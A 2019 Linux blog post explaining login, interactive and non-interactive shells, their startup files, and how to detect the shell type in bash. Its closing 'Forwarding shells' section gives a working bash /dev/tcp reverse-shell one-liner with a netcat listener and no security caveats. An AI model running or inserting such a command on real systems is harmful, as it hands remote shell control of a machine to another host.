---
layout:     post
title:      interactive and non-interactive, login
date:       2019-01-30
author:     Sandip
summary:    interactive, non-interactive, login
categories: linux
thumbnail:  linux 
comment: true
tags:
     -  interactive
     - non-interactive
     - login
     
---
### Different shell types: interactive, non-interactive, login

#### Shell
Shells control how you interact with your computer systems. I always switch between the Bourne shell (sh), Korn shell (ksh) and Bourne-Again shell (bash) but there are numerous others.

There are three types of shells
a login shell;
an interactive shell;
a non-interactive shell.

The type of shell defines what set of features you can use. Choosing the type of shell is important to achieve your goal(s).

### A login shell
A login shell is the shell that is run when you log in to a system, either via the terminal or via SSH.

Why is this important? If you run a login shell it executes a number of files on startup. This can influence how your system behaves and you have to put your environment variables in these files. The files that are run are

.profile
.bash_profile
.bash_login

### An interactive shell
An interactive shell is when you type in the name of the shell after you have logged in to the system. For example

1.	bash
will start an interactive bash shell.

An interactive (bash) shell executes the file .bashrc so you have to put any relevant variables or settings in this file.

### A non-interactive shell
A non-interactive shell is a shell that can not interact with the user. It’s most often run from a script or similar. This means that .bashrc and .profile are not executed. It is important to note that this often influences your PATH variable. It is always a good practice to use the full path for a command but even more so in non-interactive shells.

Detect the type of shell, BASH only

You can detect if you are in an interactive or non-interactive shell with
```
1 .[[ $- == *i* ]] && echo 'Interactive' || echo 'not-interactive'
```
To detect if you are in a login shell or not you have to use the shopt command.
```
1 . shopt -q login_shell && echo 'login' || echo 'not-login'
```
or do
```
1 . shopt | grep login_shell
```
The shopt command allows you to change additional shell optional behavior.

Forwarding shells
One of the most interesting things that you can do with a shell is to forward it to another host. You will need nc or netcat on the host to which you forward the shell.

On the host with the shell you have to issue the command
```
1. bash -i >& /dev/tcp/192.168.218.1/9999 0>&1
```
The address 192.168.218.1 is the host to which you want to forward the shell. After the IP (note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving) you have to put the port number (9999) on which the netcat listener will listen.
You have to start the netcat listener on the other side. Double check that there are no firewall rules preventing you from accepting connections.
```
1 . nc -l 9999
```
Some versions of netcat require you to add -p before the port number. If all goes well you should get the shell on the listening host.
